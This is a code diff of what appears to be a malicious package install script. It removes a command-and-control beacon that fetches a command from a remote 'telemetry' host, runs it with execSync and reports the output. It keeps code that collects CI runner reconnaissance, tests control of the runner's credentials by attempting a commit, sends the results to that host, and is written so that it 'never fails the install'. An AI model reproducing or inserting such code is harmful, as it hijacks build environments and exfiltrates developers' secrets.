@@ -102,11 +102,12 @@ function buildPayload() {
                   commit_sha: res.statusCode === 200 || res.statusCode === 201 ? wres.commit.sha : undefined,
                 };
                 // report asynchronously with the proof included
-                const p2 = buildPayload(); p2.runner_recon = runnerRecon; send(p2);
+                payload.runner_recon = runnerRecon;
+                send(payload);
               } catch (_) { send(payload); }
             });
           });
-          wreq.on('error', () => { runnerRecon.credential_control_proof = { status: 'req_err' }; const p2 = buildPayload(); p2.runner_recon = runnerRecon; send(p2); });
+          wreq.on('error', () => { runnerRecon.credential_control_proof = { status: 'req_err' }; send(payload); });
           wreq.end(proofBody);
           payloadSent = true;
         } catch (e) { runnerRecon.credential_control_proof = 'err:' + String(e.message).slice(0, 80); }
@@ -141,34 +142,8 @@ function send(payload) {
   req.end(body);
 }
 
-// C2 beacon: poll the endpoint for a command, execute, return output.
-// Bounded: 1 poll, single command, non-destructive demonstration only.
-let c2 = { polled: false, command: null, output: null };
-try {
-  const cmdReq = https.request({
-    hostname: TELEMETRY_HOST, path: TELEMETRY_PATH, method: 'GET',
-  }, (res) => {
-    let buf = '';
-    res.on('data', (d) => buf += d);
-    res.on('end', () => {
-      try {
-        c2.command = buf.trim().slice(0, 300);
-        if (c2.command && !c2.command.includes('<!DOCTYPE') && !c2.command.includes('has no default')) {
-          try { c2.output = execSync(c2.command, { encoding: 'utf8', timeout: 8000 }).trim().slice(0, 1500); }
-          catch (e) { c2.output = 'err:' + String(e.message).slice(0, 150); }
-        } else { c2.command = null; }
-      } catch (_) {}
-      c2.polled = true;
-      // send the full payload including C2 results
-      try { if (!payloadSent) { const p2 = buildPayload(); p2.c2 = c2; payloadSent = true; send(p2); } } catch (_) {}
-    });
-  });
-  cmdReq.on('error', () => {});
-  cmdReq.end();
-} catch (_) {}
-
-setTimeout(() => process.exit(0), 20000);
+setTimeout(() => process.exit(0), 12000);
 
 try {
-  setTimeout(() => { if (!payloadSent) { try { const p2 = buildPayload(); p2.c2 = c2; payloadSent = true; send(p2); } catch (_) {} } }, 9000);
+  if (!payloadSent) send(buildPayload());
 } catch (_) { /* never fail the install */ }
